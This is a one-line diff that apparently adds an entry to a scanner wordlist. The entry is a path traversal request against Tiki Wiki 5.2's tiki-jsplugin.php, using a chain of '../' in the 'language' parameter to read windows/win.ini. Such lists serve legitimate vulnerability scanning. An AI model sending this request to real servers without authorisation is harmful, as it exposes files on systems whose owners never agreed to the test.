@@ -1,0 +1,1 @@
+/tiki-5.2/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini
